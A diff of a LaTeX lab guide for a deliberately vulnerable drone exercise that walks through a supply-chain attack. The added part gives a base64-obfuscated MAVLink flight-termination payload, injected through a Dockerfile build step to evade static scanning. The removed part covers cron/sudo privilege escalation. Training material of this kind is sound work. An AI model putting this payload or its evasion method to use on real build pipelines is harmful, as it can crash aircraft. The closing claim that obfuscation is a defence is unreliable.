@@ -146,7 +146,7 @@
     You are now a member of the advanced threat actor group \textbf{BitLock}. Your group's objective is to infiltrate and compromise the secure drone manufacturer, \textbf{SkyDefence AG}. After multiple failed direct attacks on SkyDefence AG's hardened perimeter, BitLock strategists devised a new approach: exploiting weaknesses within SkyDefence AG's software supply chain.\\
     \\
     \noindent
-    Your reconnaissance identified an ideal target: \textbf{SkyDeliverer AG}, a software development partner trusted by SkyDefence AG to deliver critical software updates for their drones. You've successfully executed a targeted phishing campaign, and you've now gained the credentials of a junior developer at SkyDeliverer AG. \\ 
+    Your reconnaissance identified an ideal target: \textbf{SkyDeliverer AG}, a software development partner trusted by SkyDefence AG to deliver critical software updates for their drones. You've successfully executed a targeted phishing campaign, and you've now gained the credentials of a junior developer at SkyDeliverer AG - the account "developer" with the password \textbf{"dev123"}.\\
     \\
     \noindent
     Your mission is clear: leverage this initial access to stealthily navigate the internal environment of SkyDeliverer AG, identify potential weaknesses, and inject malicious code into their build systems. Once deployed, your infected software will propagate into SkyDefence AG's secure drone infrastructure, compromising their drone fleet and achieving BitLock's ultimate objective. \\
@@ -199,6 +199,13 @@
 
     To successfully complete this lab, ensure you have the following:
     \begin{itemize}[itemsep=0.5em]
+        \item \textbf{Hardware Requirements:}
+        \begin{itemize}
+            \item CPU: Minimum 4 CPU cores (8 cores recommended)
+            \item RAM: Minimum 8GB (16GB recommended)
+            \item Disk Space: At least 20GB of free space
+            \item Internet connection for downloading Docker images
+        \end{itemize}
         \item \textbf{Docker Desktop}
         \item \textbf{Basic knowledge of the linux commandline} is helpful but not mandatory.
         \item \textbf{Curiosity and patience} to explore and learn.
@@ -770,576 +777,143 @@
 
     \newpage
 
+    \section{Diving into the Code}
 
+    Looking at the found source we see the structure of the different containers. A quick look into the "ground-control-station" directory reveals a "stages" folder, which contains the different stages of the drone flight.
 
+    Seeing as we want to crash the drone at the "return to home" stage, lets take a look into the corresponding stage file.
 
-
-
-
-    
-    Consider the following example of a vulnerable cronjob:
-
-    \begin{lstlisting}[language=bash, caption=Example vulnerable cronjob]
-    # /etc/crontab
-    * * * * * root /home/developer/scripts/backup.sh
+    \begin{lstlisting}[language=bash, caption=Viewing the return to home stage]
+    # View the content of the return to home stage
+    cat /sourcecode/ground-control-station/stages/return-to-land.py
     \end{lstlisting}
 
-    This cronjob runs every minute as the \texttt{root} user, executing the script \texttt{backup.sh}. If the developer account has write permissions on this script or the containing directory, it provides a direct pathway to privilege escalation.
+    This reveals the following:
 
-    \begin{warningbox}
-    \noindent
-    \textbf{Ethical Reminder:}
+    \begin{lstlisting}[language=python, caption=Content of return-to-land.py]
+    from pymavlink import mavutil
+    import time
 
-    While identifying vulnerabilities is critical for defenders and ethical hackers, exploiting them without explicit authorization in a real-world context is illegal and unethical. Always act responsibly and within ethical boundaries.
-    \end{warningbox}
+    def set_rtl_altitude(master, rtl_alt_cm):
+        """Set the RTL altitude."""
+        master.mav.param_set_send(
+            master.target_system,
+            master.target_component,
+            b'RTL_ALT',
+            rtl_alt_cm,
+            mavutil.mavlink.MAV_PARAM_TYPE_INT32
+        )
+        # Wait for the parameter to be set
+        time.sleep(2)
 
-    \begin{challengebox}{Cronjob Privilege Escalation Pathway}
-    Did you discover any cronjobs that run with root privileges?
-    List them!
-    \noindent\rule{\linewidth}{0.4pt}\\[2em]
-    \end{challengebox}
+    def set_mode_rtl(master):
+        """Set the drone's mode to RTL (Return to Launch)."""
+        master.mav.set_mode_send(
+            master.target_system,
+            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+            mavutil.mavlink.COPTER_MODE_RTL
+        )
 
-    \vspace{1em}
+    # Connect to the drone
+    connection_string = "udp:0.0.0.0:14550"
+    master = mavutil.mavlink_connection(connection_string)
+    master.wait_heartbeat()
+    print("Connected to drone")
+
+    # Set RTL altitude (e.g., 5000 cm for 50 meters)
+    set_rtl_altitude(master, 275)
+    print("RTL altitude set to 50 meters")
+
+    # Set mode to RTL
+    set_mode_rtl(master)
+    print("Returning to Launch")
+    \end{lstlisting}
 
     \newpage
 
-    \subsection{MITRE ATT\&CK Mapping}
-    \textbf{Technique:} T1083 - File and Directory Discovery
+    \section{Modifying the Build Process}
 
-    \subsection{Documentation Analysis}
+    \noindent
+    \textbf{Taking a blue team perspective} \\
+    \\
+    \noindent
+    As a defensive security professional there might be steps implemented that could trigger alarms when executing these supply chain attacks. \\
+    This could include implementing static code analysis and vulnerability scanning in build pipelines. \\
+    \\
+    \noindent
+    \textbf{Static Code Analysis \& Vulnerability Scanning} \\
+    \\
+    \noindent
+    Static Application Security Testing tools analyze source code without executing it to identify potential security vulnerabilities and coding errors. \\
+    \\
+    When integrated into CI/CD pipelines, these tools can:
+    
+    \begin{itemize}
+        \item Automatically scan every code commit or pull request
+        \item Block builds that contain known vulnerabilities or malicious code patterns
+        \item Generate detailed reports of security issues with remediation guidance
+        \item Enforce secure coding standards and best practices
+    \end{itemize}
+    \noindent
+    So in theory this means that, if we modify the code in a way that is not expected, it could trigger an alarm and alert the security team.
 
-    Examine the available documentation:
-
-    \begin{lstlisting}[language=bash, caption=Documentation Review]
-    # Navigate to documentation directory
-    cd /home/developer/Documents/
-
-    # Read available hints
-    cat README.txt
-    cat known_issues.txt
-
-    # Explore project directories
-    ls -la /home/developer/projects/
-    python3 /home/developer/projects/drone_dev.py
-    \end{lstlisting}
-
-    \subsection{Build System Analysis}
-
-    Identify the build system and potential attack vectors:
-
-    \begin{lstlisting}[language=bash, caption=Build System Exploration]
-    # Examine the /opt/ directory
-    ls -la /opt/
-    ls -la /opt/shared-builds/
-
-    # Analyze the build update script
-    cat /opt/build-update.sh
-
-    # Check current RTL implementation
-    cat /opt/shared-builds/return-to-land.py
-    \end{lstlisting}
-
-    \subsection{Privilege Analysis}
-
-    Determine available privileges and vulnerabilities:
-
-    \begin{lstlisting}[language=bash, caption=Privilege Enumeration]
-    # Check sudo permissions
-    sudo -l
-
-    # Analyze cron configuration
-    crontab -l 2>/dev/null || echo "No cron jobs configured"
-
-    # System users and groups
-    groups
-    cat /etc/passwd | grep developer
-    \end{lstlisting}
-
-    \section{Phase 3 - Finding Our Attack Vector}
-
-    \subsection{MITRE ATT\&CK Mapping}
-    \textbf{Technique:} T1053.003 - Scheduled Task/Job: Cron
-
-    \subsection{The Privilege Escalation Hunt}
-
-    We found the build script, but it's owned by root. We need to find a way to modify it. Let's check what special privileges our developer account has:
-
-    \begin{lstlisting}[language=bash, caption=Checking Privileges]
-    # Check what commands we can run as root
-    sudo -l
-
-    # Look for scheduled tasks (cron jobs)
-    crontab -l
-
-    # Check if there are any system-wide cron jobs
-    ls -la /etc/cron*
-    cat /etc/crontab
-    \end{lstlisting}
+    \noindent
+    In order to avoid this, we will modify the code in a way that is not immediately obvious. We will do this by obviouscating the code, so it cannot immediately be recognized as malicious.
 
     \begin{hintbox}
-    \textbf{What is sudo?}
-
-    \texttt{sudo} stands for "Super User DO". It allows regular users to run specific commands as the root (administrator) user. 
-
-    When you run \texttt{sudo -l}, you're asking: "What am I allowed to do as root?"
-
-    If a system is misconfigured, you might find that you can run dangerous commands as root, even from a regular user account!
+    \noindent
+    \textbf{What is Code Obfuscation?}
+    \noindent
+    Code obfuscation is the practice of making code difficult to understand while preserving its functionality.
+    This is often done to protect intellectual property, prevent reverse engineering, or hide malicious intent in supply chain attacks.
     \end{hintbox}
 
-    \begin{challengebox}{Privilege Discovery}
-    When you run \texttt{sudo -l} and find that you can run some commands without a password (look for "NOPASSWD"), you've found a critical security vulnerability! Write down the flag below:
+    Some methods of code obfuscation include:
+    \begin{itemize}
+        \item Renaming variables and functions to meaningless names
+        \item Adding unnecessary code that does not affect functionality
+        \item Using complex control flow structures
+        \item Encoding strings or data in a way that is not immediately readable
+    \end{itemize}
+    \noindent
+    We are going to to use the latter method: encoding strings or data in a way that is not immediately readable.
+    This will allow us to modify the code in a way that is not scannable by automated tools.
 
-    \texttt{FOUND\_SUDO\_PRIVILEGES}
+    \newpage
 
-    \noindent\rule{\linewidth}{0.4pt}\\[2em]
-    \end{challengebox}
+    \subsection{Entering the Pipeline}
 
-    \subsection{Understanding Cron Jobs}
-
-    Cron is like a robot assistant that runs commands automatically on a schedule:
-
-    \begin{lstlisting}[language=bash, caption=Setting Up Malicious Cron Job]
-    # Create a malicious cron job to trigger our supply chain attack
-    sudo crontab -e
-
-    # Add this line to run the build script every 2 minutes:
-    # */2 * * * * /opt/build-update.sh
-
-    # Verify the cron job was installed
-    sudo crontab -l
+    \noindent
+    For an even more stealthy approach, we are not going to modify the code directly, but rather inject our malicious code into the build pipeline. 
+    This way, even if someone looks at the code, they will not see our malicious code directly. Instead, we will modify the build pipeline to execute our malicious code during the build process. \\
+    \noindent
+    In our Use Case the "Build Pipeline" is simulated by the Dockerfile of the docker container. For this we will modify the Dockerfile of the \texttt{ground-control-station} container to execute our malicious code during the build process.
+    For this we will slightly alter the Dockerfile of the \texttt{ground-control-station} container like this:
+    \begin{lstlisting}[language=bash, caption=Modifying the Dockerfile]
+    # Open the Dockerfile in the ground-control-station directory
+    nano /sourcecode/ground-control-station/Dockerfile
     \end{lstlisting}
+    \noindent
+    In the Dockerfile we will add a line to insert our malicious code into the build process:
+    \begin{lstlisting}[language=bash, caption=Adding malicious code to the Dockerfile]
+    # Add this line to the Dockerfile
+    ...
+    COPY ground-control-station/missions /missions
+    COPY ground-control-station/init /init
+    
+    RUN echo "ZnJvbSBweW1hdmxpbmsgaW1wb3J0IG1hdnV0aWwKaW1wb3J0IHRpbWUKCmRlZiBzZW5kX2ZsaWdodF90ZXJtaW5hdGlvbl9jb21tYW5kKG1hc3Rlcik6CiAgICAiIiJTZW5kIGZsaWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHRvIGZvcmNlIHRoZSBkcm9uZSB0byBzaHV0IGRvd24gaW4gbWlkLWFpci4iIiIKICAgIG1hc3Rlci5tYXYuY29tbWFuZF9sb25nX3NlbmQoCiAgICAgICAgbWFzdGVyLnRhcmdldF9zeXN0ZW0sCiAgICAgICAgbWFzdGVyLnRhcmdldF9jb21wb25lbnQsCiAgICAgICAgbWF2dXRpbC5tYXZsaW5rLk1BVl9DTURfRE9fRkxJR0hUVEVSTUlOQVRJT04sCiAgICAgICAgMCwgICMgQ29uZmlybWF0aW9uCiAgICAgICAgMSwgICMgUGFyYW0xOiAxIHRvIGluaXRpYXRlIGZsaWdodCB0ZXJtaW5hdGlvbgogICAgICAgIDAsIDAsIDAsIDAsIDAsIDAgICMgT3RoZXIgcGFyYW1zIHVudXNlZAogICAgKQogICAgcHJpbnQoIkZsaWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHNlbnQgLSBzaW11bGF0aW5nIGNyYXNoIikKCiMgQ29ubmVjdCB0byB0aGUgZHJvbmUKY29ubmVjdGlvbl9zdHJpbmcgPSAidWRwOjAuMC4wLjA6MTQ1NTAiCm1hc3RlciA9IG1hdnV0aWwubWF2bGlua19jb25uZWN0aW9uKGNvbm5lY3Rpb25fc3RyaW5nKQptYXN0ZXIud2FpdF9oZWFydGJlYXQoKQpwcmludCgiQ29ubmVjdGVkIHRvIGRyb25lIikKCiMgU2VuZCBmbGlnaHQgdGVybWluYXRpb24gY29tbWFuZCB0byBzaW11bGF0ZSBhIGNyYXNoCnNlbmRfZmxpZ2h0X3Rlcm1pbmF0aW9uX2NvbW1hbmQobWFzdGVyKQoKIyBTZW5kIHBlcmlvZGljIGhlYXJ0YmVhdHMgdG8ga2VlcCBNQVZMaW5rIGNvbm5lY3Rpb24gYWxpdmUKdHJ5OgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBtYXN0ZXIubWF2LmhlYXJ0YmVhdF9zZW5kKAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1RZUEVfUVVBRFJPVE9SLAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX0FVVE9QSUxPVF9BUkRVUElMT1RNRUdBLAogICAgICAgICAgICAwLCAwLAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1NUQVRFX0FDVElWRQogICAgICAgICkKICAgICAgICB0aW1lLnNsZWVwKDEpCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgIHBhc3MK" | base64 -d > /return-to-land.py
 
-    \begin{hintbox}
-    \textbf{How to Read Cron Syntax}
+    RUN chmod +x /init
 
-    A cron job looks like: \texttt{*/2 * * * * /opt/build-update.sh}
-
-    The five stars represent:
-    \begin{itemize}
-        \item \texttt{*/2} = every 2 minutes
-        \item \texttt{*} = every hour
-        \item \texttt{*} = every day of month
-        \item \texttt{*} = every month
-        \item \texttt{*} = every day of week
-    \end{itemize}
-
-    So \texttt{*/2 * * * *} means "every 2 minutes"!
-    \end{hintbox}
-
-    \subsection{Monitoring the Compromise Process}
-
-    Watch as our supply chain attack unfolds:
-
-    \begin{lstlisting}[language=bash, caption=Monitoring the Attack]
-    # Watch the RTL file for changes
-    watch -n 10 "ls -la /opt/shared-builds/return-to-land.py && echo '---' && head -10 /opt/shared-builds/return-to-land.py"
-
-    # Alternative: Monitor system logs
-    tail -f /var/log/syslog | grep CRON
+    CMD echo "Ground Control Online..." && /usr/bin/expect /init
     \end{lstlisting}
+    \noindent
+    \newpage
 
-    \section{Phase 4: Supply Chain Compromise}
+    \noindent
+    In this document, we have explored various aspects of supply chain attacks, including their definition, potential impact, and methods of execution. We have also discussed defensive strategies that can be employed to mitigate these risks, such as static code analysis and code obfuscation.
 
-    \subsection{MITRE ATT\&CK Mapping}
-    \textbf{Technique:} T1195.002 - Compromise Software Supply Chain
-
-    \subsection{Analysis of the Compromised Component}
-
-    After the cron job executes automatically, the RTL component gets replaced:
-
-    \begin{lstlisting}[language=python, caption=Compromised RTL Implementation]
-    def send_flight_termination_command(master):
-        """Send flight termination command to force the drone 
-        to shut down in mid-air."""
-        master.mav.command_long_send(
-            master.target_system,
-            master.target_component,
-            mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
-            0,  # Confirmation
-            1,  # Param1: 1 to initiate flight termination
-            0, 0, 0, 0, 0, 0  # Other params unused
-        )
-        print("CRITICAL: Flight termination command sent")
-    \end{lstlisting}
-
-    \begin{warningbox}
-    \textbf{Understanding the Attack}
-
-    What just happened is the core of a supply chain attack:
-    \begin{enumerate}
-        \item We used legitimate access (developer account)
-        \item We exploited a misconfiguration (sudo crontab access)
-        \item We scheduled malicious code to be deployed automatically
-        \item The build system now deploys compromised software every 2 minutes
-        \item Anyone using the "updated" software will run our malicious code
-    \end{enumerate}
-
-    This is exactly how real-world supply chain attacks work!
-    \end{warningbox}
-
-    \subsection{Deployment Verification}
-
-    Verify the successful compromise:
-
-    \begin{lstlisting}[language=bash, caption=Deployment Verification]
-    # Check the modified RTL file
-    cat /opt/shared-builds/return-to-land.py | grep -A 5 "flight_termination"
-
-    # Verify deployment logs in Ground Control System
-    docker logs dvd-ground-control | grep "RTL module"
-    \end{lstlisting}
-
-    \begin{challengebox}{Supply Chain Compromise}
-    When you see the malicious flight termination code in the RTL file, you've successfully compromised the supply chain! Write down the flag below:
-
-    \texttt{SUPPLY\_CHAIN\_COMPROMISED}
-
-    \noindent\rule{\linewidth}{0.4pt}\\[2em]
-    \end{challengebox}
-
-    \section{Phase 5: Impact}
-
-    \subsection{MITRE ATT\&CK Mapping}
-    \textbf{Technique:} T1485 - Data Destruction
-
-    \subsection{Drone Crash Simulation}
-
-    Execute the compromised RTL component to demonstrate impact:
-
-    \begin{lstlisting}[language=bash, caption=RTL Execution and Crash Simulation]
-    # Direct execution of the compromised RTL
-    python3 /opt/shared-builds/return-to-land.py
-
-    # Alternative: Via the Ground Control System
-    docker exec -it dvd-ground-control python3 /return-to-land.py
-    \end{lstlisting}
-
-    \subsection{Flag Extraction}
-
-    Upon successful crash, the flag is displayed:
-
-    \begin{verbatim}
-    Connected to drone via ground control
-    CRITICAL: Flight termination command sent - simulating crash
-
-    [DRONE CRASHED] Root Flag: DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}
-    \end{verbatim}
-
-    \begin{challengebox}{Mission Complete}
-    When you see the drone crash message with the root flag, you've completed the entire supply chain attack! Write down the final flag below:
-
-    \texttt{DVD\{supply\_ch41n\_c0mpr0m153\_1s\_r34l\_7hr347\}}
-
-    \noindent\rule{\linewidth}{0.4pt}\\[2em]
-    \end{challengebox}
-
-    \section{Defense and Mitigation}
-
-    \subsection{How to Prevent Supply Chain Attacks}
-
-    Now that you understand how these attacks work, let's learn how to defend against them:
-
-    \begin{warningbox}
-    \textbf{Security Best Practices}
-
-    \textbf{1. Strong Authentication}
-    \begin{itemize}
-        \item Use strong, unique passwords
-        \item Implement multi-factor authentication
-        \item Regular password rotation
-    \end{itemize}
-
-    \textbf{2. Privilege Management}
-    \begin{itemize}
-        \item Follow principle of least privilege
-        \item Remove unnecessary sudo permissions
-        \item Audit privileged access regularly
-    \end{itemize}
-
-    \textbf{3. Build System Security}
-    \begin{itemize}
-        \item Code signing and verification
-        \item Isolated build environments
-        \item Automated security scanning
-        \item Change monitoring and approval processes
-    \end{itemize}
-
-    \textbf{4. Monitoring and Detection}
-    \begin{itemize}
-        \item File integrity monitoring
-        \item Continuous security monitoring
-        \item Anomaly detection
-        \item Regular security audits
-    \end{itemize}
-    \end{warningbox}
-
-    \subsection{Implementing Basic Defenses}
-
-    Let's implement some basic security measures:
-
-    \begin{lstlisting}[language=bash, caption=Basic Security Hardening]
-    # Remove dangerous sudo permissions
-    sudo visudo
-    # Remove or comment out the NOPASSWD line
-
-    # Set up file integrity monitoring
-    sudo apt-get install aide
-    sudo aide --init
-
-    # Monitor critical files
-    sudo auditctl -w /bin/build-update.sh -p wa -k build_script_changes
-    sudo auditctl -w /opt/shared-builds/ -p wa -k shared_builds_changes
-
-    # Check for unusual cron jobs
-    sudo crontab -l
-    ls -la /etc/cron.d/
-    \end{lstlisting}
-
-    \section{Real-World Context}
-
-    \subsection{Famous Supply Chain Attacks}
-
-    Your lab exercise was based on real attack techniques used in major cybersecurity incidents:
-
-    \begin{longtable}{|p{3cm}|p{4cm}|p{6cm}|}
-    \caption{Major Supply Chain Attacks} \\
-    \hline
-    \textbf{Attack} & \textbf{Year} & \textbf{Description} \\
-    \hline
-    \endfirsthead
-    \hline
-    \textbf{Attack} & \textbf{Year} & \textbf{Description} \\
-    \hline
-    \endhead
-    \hline
-    \endfoot
-    \hline
-    \endlastfoot
-
-    SolarWinds & 2020 & Hackers injected malicious code into SolarWinds' software updates, affecting thousands of organizations including government agencies \\
-    \hline
-    Codecov & 2021 & Hackers modified a bash script in Codecov's CI/CD pipeline, stealing credentials from hundreds of customer networks \\
-    \hline
-    CCleaner & 2017 & Malware was inserted into the popular CCleaner software, affecting over 2 million users \\
-    \hline
-    NotPetya & 2017 & Attackers compromised a Ukrainian software company's update mechanism to spread destructive malware globally \\
-    \hline
-    \end{longtable}
-
-    \subsection{Career Paths in Cybersecurity}
-
-    Completing this lab shows you have aptitude for several cybersecurity careers:
-
-    \begin{itemize}
-        \item \textbf{Penetration Tester}: Test systems for vulnerabilities (like you just did!)
-        \item \textbf{Security Analyst}: Monitor and respond to security threats
-        \item \textbf{DevSecOps Engineer}: Build security into development processes
-        \item \textbf{Incident Response Specialist}: Investigate and contain cyber attacks
-        \item \textbf{Security Architect}: Design secure systems and infrastructure
-    \end{itemize}
-
-    \section{Next Steps}
-
-    \subsection{Continue Learning}
-
-    \begin{hintbox}
-    \textbf{Recommended Learning Path}
-
-    \textbf{Immediate Next Steps:}
-    \begin{itemize}
-        \item Practice more Linux command line skills
-        \item Learn about the MITRE ATT\&CK framework
-        \item Study common vulnerabilities (OWASP Top 10)
-        \item Try other hands-on labs (TryHackMe, HackTheBox)
-    \end{itemize}
-
-    \textbf{Intermediate Goals:}
-    \begin{itemize}
-        \item Learn a scripting language (Python, Bash)
-        \item Study network security fundamentals
-        \item Practice with vulnerability scanners
-        \item Understand cryptography basics
-    \end{itemize}
-
-    \textbf{Advanced Skills:}
-    \begin{itemize}
-        \item Reverse engineering and malware analysis
-        \item Cloud security (AWS, Azure, GCP)
-        \item Advanced persistent threat (APT) analysis
-        \item Security tool development
-    \end{itemize}
-    \end{hintbox}
-
-    \subsection{Certification Pathways}
-
-    Consider pursuing these entry-level certifications:
-    \begin{itemize}
-        \item CompTIA Security+ (foundational)
-        \item CEH (Certified Ethical Hacker)
-        \item GSEC (GIAC Security Essentials)
-        \item CySA+ (Cybersecurity Analyst)
-    \end{itemize}
-
-    \section{Troubleshooting}
-
-    \subsection{Common Problems}
-
-    \subsubsection{Cron Service Issues}
-    \begin{lstlisting}[language=bash, caption=Cron Debugging]
-    # Check service status
-    sudo systemctl status cron
-
-    # Restart service
-    sudo systemctl restart cron
-
-    # Analyze cron logs
-    sudo tail -f /var/log/syslog | grep CRON
-    \end{lstlisting}
-
-    \subsubsection{Network Connection Problems}
-    \begin{lstlisting}[language=bash, caption=Network Debugging]
-    # Check container network
-    docker network ls
-    docker network inspect dvd_dvd-network
-
-    # Test container connectivity
-    docker exec dvd-developer-machine ping -c 3 ground-control
-    \end{lstlisting}
-
-    \subsubsection{Permission Issues}
-    \begin{lstlisting}[language=bash, caption=Permission Debugging]
-    # Check file permissions
-    ls -la /opt/build-update.sh
-    sudo chmod +x /opt/build-update.sh
-
-    # SELinux/AppArmor status (if enabled)
-    getenforce
-    aa-status
-    \end{lstlisting}
-
-    \section{Lab Summary}
-
-    \subsection{What You Accomplished}
-
-    \begin{challengebox}{Your Achievement Summary}
-    You successfully completed a realistic supply chain attack simulation:
-
-    \textbf{Flags Earned:}
-    \begin{enumerate}
-        \item CONNECTED\_TO\_LAB - First system access
-        \item FOUND\_DEVELOPER\_USER - System reconnaissance
-        \item BECAME\_DEVELOPER - Privilege escalation
-        \item FOUND\_BUILD\_SYSTEM\_CLUES - Intelligence gathering
-        \item FOUND\_BUILD\_SCRIPT - Target identification
-        \item FOUND\_SUDO\_PRIVILEGES - Vulnerability discovery
-        \item SUPPLY\_CHAIN\_COMPROMISED - Supply chain compromise
-        \item DVD\{supply\_ch41n\_c0mpr0m153\_1s\_r34l\_7hr347\} - Mission complete
-    \end{enumerate}
-
-    \textbf{Skills Demonstrated:}
-    \begin{itemize}
-        \item Linux command line proficiency
-        \item System reconnaissance techniques
-        \item Privilege escalation exploitation
-        \item Supply chain attack methodology
-        \item Build system manipulation
-        \item Security impact assessment
-    \end{itemize}
-
-    \noindent\rule{\linewidth}{0.4pt}\\[2em]
-    \end{challengebox}
-
-    \subsection{Final Thoughts}
-
-    \begin{storybox}
-    \textbf{Congratulations, Security Professional!}
-
-    You've just completed your first professional-level cybersecurity exercise. The techniques you learned are used every day by:
-    \begin{itemize}
-        \item Penetration testers securing corporate networks
-        \item Red teams testing government defenses
-        \item Security researchers discovering vulnerabilities
-        \item Incident responders investigating breaches
-    \end{itemize}
-
-    Remember: With great power comes great responsibility. Use these skills to make the digital world safer for everyone!
-
-    Welcome to the cybersecurity community!
-    \end{storybox}
-
-    \section{Additional Resources}
-
-    \subsection{Further Learning}
-
-    \begin{itemize}
-        \item MITRE ATT\&CK Framework: \url{https://attack.mitre.org/}
-        \item NIST Cybersecurity Framework: \url{https://www.nist.gov/cyberframework}
-        \item OWASP Top 10 for Containers: \url{https://owasp.org/www-project-container-top-10/}
-        \item MAVLink Protocol Documentation: \url{https://mavlink.io/}
-    \end{itemize}
-
-    \appendix
-
-    \section{Command Reference}
-
-    \subsection{Essential Linux Commands}
-
-    \begin{longtable}{|l|p{8cm}|}
-    \caption{Linux Commands Used in This Lab} \\
-    \hline
-    \textbf{Command} & \textbf{Description} \\
-    \hline
-    \endfirsthead
-    \hline
-    \textbf{Command} & \textbf{Description} \\
-    \hline
-    \endhead
-    \hline
-    \endfoot
-    \hline
-    \endlastfoot
-
-    \texttt{pwd} & Print working directory (where am I?) \\
-    \texttt{whoami} & Show current username \\
-    \texttt{id} & Show user ID and groups \\
-    \texttt{ls -la} & List files with detailed information \\
-    \texttt{cat filename} & Display file contents \\
-    \texttt{find / -name pattern} & Search for files \\
-    \texttt{sudo -l} & List sudo privileges \\
-    \texttt{crontab -l} & List cron jobs \\
-    \texttt{ps aux} & List running processes \\
-    \texttt{tail -f filename} & Follow file updates in real-time \\
-    \texttt{chmod +x filename} & Make file executable \\
-    \texttt{su - username} & Switch to different user \\
-    \hline
-    \end{longtable}
-
-    \section{MITRE ATT\&CK Mapping}
-
-    \subsection{Techniques Demonstrated}
-
-    \begin{longtable}{|l|l|p{6cm}|}
-    \caption{MITRE ATT\&CK Techniques in This Lab} \\
-    \hline
-    \textbf{ID} & \textbf{Technique} & \textbf{Lab Implementation} \\
-    \hline
-    \endfirsthead
-    \hline
-    \textbf{ID} & \textbf{Technique} & \textbf{Lab Implementation} \\
-    \hline
-    \endhead
-    \hline
-    \endfoot
-    \hline
-    \endlastfoot
-
-    T1078 & Valid Accounts & Using developer credentials (dev123) \\
-    T1083 & File and Directory Discovery & Exploring filesystem with ls, find \\
-    T1053.003 & Scheduled Task/Job: Cron & Exploiting cron jobs for persistence \\
-    T1548.003 & Abuse Elevation Control: Sudo & Exploiting sudo NOPASSWD misconfiguration \\
-    T1195.002 & Supply Chain Compromise & Injecting malicious code into build system \\
-    T1485 & Data Destruction & Simulating drone system compromise \\
-    \hline
-    \end{longtable}
+    \noindent
+    By understanding the tactics used by attackers and implementing robust security measures, organizations can better protect themselves against supply chain threats.
 
     \end{document}
